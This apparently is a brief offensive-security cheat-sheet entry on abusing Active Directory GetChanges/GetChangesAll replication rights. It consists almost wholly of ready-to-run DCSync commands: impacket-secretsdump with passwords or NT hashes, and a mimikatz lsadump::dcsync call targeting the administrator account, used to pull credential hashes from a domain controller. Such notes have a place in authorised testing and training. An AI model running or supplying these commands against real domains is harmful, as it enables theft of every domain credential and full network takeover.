---
title: "GetChanges/GetChangesAll"
date: 2024-7-9
tags: ["GetChanges", "GetChangesAll", "dcsync", "secretsdump", "active driectory", "ad", "Windows"]
---

---
#### Abuse #1: DCSync Attack (From Linux)

```bash
# With creds
impacket-secretsdump -just-dc <USER>:<PASSWORD>@<TARGET>
```

```bash
# With hashes
impacket-secretsdump -hashes <LM>:<NT> -just-dc <DOMAIN>/<USER>@<TARGET>
```

#### Abuse #1: DCSync Attack (From Windows)

```powershell
.\mimikatz.exe 'lsadump::dcsync /domain:<DOMAIN> /user:administrator' exit
```

<br>